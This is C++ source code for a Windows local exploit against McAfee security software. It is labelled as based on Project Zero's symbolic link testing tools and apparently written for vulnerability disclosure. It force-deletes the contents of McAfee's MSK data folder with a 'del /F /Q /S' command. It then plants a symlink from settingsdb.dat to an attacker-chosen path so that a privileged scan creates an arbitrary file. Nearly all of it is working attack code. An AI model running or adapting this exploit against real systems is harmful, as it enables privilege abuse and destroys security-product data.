
//  Copyright 2020 Neurosoft Inc. All Rights Reserved.
//
//  Licensed under the Apache License, Version 2.0 (the "License");
//  you may not use this file except in compliance with the License.
//  You may obtain a copy of the License at
//
//  http ://www.apache.org/licenses/LICENSE-2.0
//
//  Unless required by applicable law or agreed to in writing, software
//  distributed under the License is distributed on an "AS IS" BASIS,
//  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//  See the License for the specific language governing permissions and
//  limitations under the License.

//  This exploit code is heavily based on symboliclink testing tools from google's project zero 
//  https://github.com/googleprojectzero/symboliclink-testing-tools

#include "stdafx.h"

#include <FileSymlink.h>
#include <windows.h>
#include <iostream>
#include <string.h>
#include <sys/stat.h>
#include <Shlwapi.h>

//using namespace std;

inline bool FileExists(const LPCWSTR& name) {
	struct _stat buf;
	return (_wstat(name, &buf) == 0);
}

void cls()
{
	system("@cls||clear");
}
int _tmain()
{

	HANDLE exploit = GetCurrentThread();
	SetThreadPriority(exploit, THREAD_PRIORITY_TIME_CRITICAL);

	PWSTR cmdline = GetCommandLineW();
	int argc;
	PWSTR* argv = CommandLineToArgvW(cmdline, &argc);
	LPCWSTR createFile = argv[1];
	bool retval = false;


	system("del /F /Q /S C:\\ProgramData\\McAfee\\MSK\\*.* > nul 2>&1");

	if (PathIsDirectoryEmpty(L"C:\\ProgramData\\McAfee\\MSK\\"))
	{
		std::wcout << "C:\\ProgramData\\McAfee\\MSK\\ is empty! \n\n" << std::endl;
	}
	else {
		std::wcout << "C:\\ProgramData\\McAfee\\MSK\\ is NOT empty! \n\n" << std::endl;
		std::wcout << "Reboot and try again! \n\n" << std::endl;
		return 0;
	}

	
	std::wstring settingsdb_dat = L"C:\\ProgramData\\McAfee\\MSK\\settingsdb.dat";



	LPCWSTR baseobjdir = nullptr;

	bool permanent = false;
	FileSymlink csv(permanent);

	//cls();
	csv.CreateSymlink(settingsdb_dat.c_str(), createFile, baseobjdir);
	//cls();
	std::wcout << "Scan a file and wait... \n\n" << std::endl;

	Sleep(10000);


	// Search for the presence of a file with a true result.
	Wow64DisableWow64FsRedirection(NULL);
	do {
		retval = FileExists(createFile);
	} while (retval != true);


	std::wcout << "The file " << createFile << " was Created\n\n" << std::endl;
	std::wcout << "Reboot the system\n\n" << std::endl;

	return 0;
	
}
